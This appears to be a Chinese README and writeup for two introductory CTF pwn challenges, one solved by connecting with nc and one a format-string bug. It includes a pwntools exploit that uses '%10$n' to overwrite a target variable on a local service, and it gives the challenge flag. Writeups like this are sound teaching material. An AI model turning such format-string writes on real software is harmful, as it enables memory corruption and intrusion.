# readme

## 题目信息

1. helloworld
2. pwn1

这两个题是用ctf_xinetd搭建，pwn_deploy_chroot搭建的是同一题目，不一一列举了

## 题目描述

1. hello_pwn
2. 相等就能得到flag

## 题目提示

1. 连接一下
2. 注意输出

## 题目考点

1. nc
2. %n能干什么，%(offset)$n能干什么

## writeup

1. helloworld

![](截图\Snipaste_2020-02-22_16-12-29.png)

2. pwn1

![](截图\Snipaste_2020-02-22_16-16-30.png)

先查输入字符偏移为10，利用%10$n将前8个字符统计出来并传入指定偏移位置

**exp**

```python
from pwn import *
p = remote('127.0.0.1',1113)
pwnme_addr = 0x804A068           
p.sendlineafter("name:\n",'aaa')
payload = p32(pwnme_addr)+'aaaa'+'%10$n'     
p.sendlineafter("please:\n",payload)
p.interactive()
```

## 题目flag

ctf{oh_you_find_me}

## 仓库截图

![](截图\Snipaste_2020-02-22_16-32-23.png)